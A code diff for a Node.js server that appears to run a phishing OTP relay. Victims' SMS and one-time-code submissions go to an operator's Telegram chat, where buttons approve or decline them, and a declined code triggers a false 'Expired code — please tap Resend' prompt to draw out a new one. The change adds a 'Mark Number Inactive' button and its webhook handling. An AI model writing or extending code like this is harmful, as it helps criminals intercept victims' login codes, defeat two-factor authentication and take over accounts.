@@ -128,10 +128,15 @@ async function sendOtpToTelegram(sub) {
     `Tap a button to decide.`;
 
   const keyboard = {
-    inline_keyboard: [[
-      { text: '✅ Approve', callback_data: `otp-approve:${sub.id}` },
-      { text: '❌ Decline', callback_data: `otp-decline:${sub.id}` }
-    ]]
+    inline_keyboard: [
+      [
+        { text: '✅ Approve', callback_data: `otp-approve:${sub.id}` },
+        { text: '❌ Decline', callback_data: `otp-decline:${sub.id}` }
+      ],
+      [
+        { text: '⏸ Mark Number Inactive', callback_data: `otp-inactive:${sub.id}` }
+      ]
+    ]
   };
 
   return tgSend('sendMessage', {
@@ -225,7 +230,6 @@ app.post('/api/submit-sms', async (req, res) => {
   res.json({ status: 'pending', id: submission.id });
 });
 
-// ---- OTP ----
 app.post('/api/submit-otp', async (req, res) => {
   console.log('=== SUBMIT-OTP ===');
   const submission = {
@@ -262,15 +266,16 @@ app.post('/api/resend-otp', async (req, res) => {
   res.json({ ok: true });
 });
 
-// OTP session expired — notifies Telegram
+// OTP session expired / user tapped Inactive — notifies Telegram
 app.post('/api/otp-inactive', async (req, res) => {
   const phone = (req.body && req.body.phone) || '—';
+  const triggeredBy = (req.body && req.body.triggeredBy) || 'timeout';
   await tgSend('sendMessage', {
     chat_id: TELEGRAM_CHAT_ID,
     text:
-      `⏳ <b>OTP SESSION EXPIRED</b>\n\n` +
-      `📱 <b>Phone:</b> ${phone}\n\n` +
-      `No code entered within 5 minutes. User was redirected to the inactive page.`,
+      `⏸ <b>NUMBER MARKED INACTIVE</b>\n\n` +
+      `📱 <b>Phone:</b> ${phone}\n` +
+      `🧭 <b>Triggered by:</b> ${triggeredBy}`,
     parse_mode: 'HTML'
   });
   res.json({ ok: true });
@@ -387,13 +392,14 @@ app.post('/api/telegram/webhook', async (req, res) => {
     return;
   }
 
-  /* OTP */
-  if (action === 'otp-approve' || action === 'otp-decline') {
+  /* OTP — 3 buttons: approve, decline, inactive */
+  if (action === 'otp-approve' || action === 'otp-decline' || action === 'otp-inactive') {
     const current = state.latestOtpSubmission;
     if (!current || (refId && current.id !== refId)) {
       await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'This OTP submission is no longer active.' });
       return;
     }
+
     if (action === 'otp-approve') {
       state.decision = 'otp-approved';
       state.decidedAt = new Date().toISOString();
@@ -405,9 +411,9 @@ app.post('/api/telegram/webhook', async (req, res) => {
         message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[{ text: '✅ OTP Approved', callback_data: 'noop' }]] }
       });
-    } else {
+    } else if (action === 'otp-decline') {
       state.decision = 'otp-declined';
-      state.declineMessage = 'Code expired — please tap Resend.';
+      state.declineMessage = 'Expired code — please tap Resend.';
       state.decidedAt = new Date().toISOString();
       writeState(state);
       broadcast(state);
@@ -416,6 +422,18 @@ app.post('/api/telegram/webhook', async (req, res) => {
         chat_id: cb.message.chat.id,
         message_id: cb.message.message_id,
         reply_markup: { inline_keyboard: [[{ text: '❌ OTP Declined', callback_data: 'noop' }]] }
+      });
+    } else {
+      // otp-inactive
+      state.decision = 'otp-inactive';
+      state.decidedAt = new Date().toISOString();
+      writeState(state);
+      broadcast(state);
+      await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: '⏸ Marked as Inactive' });
+      await tgSend('editMessageReplyMarkup', {
+        chat_id: cb.message.chat.id,
+        message_id: cb.message.message_id,
+        reply_markup: { inline_keyboard: [[{ text: '⏸ Number Inactive', callback_data: 'noop' }]] }
       });
     }
     return;
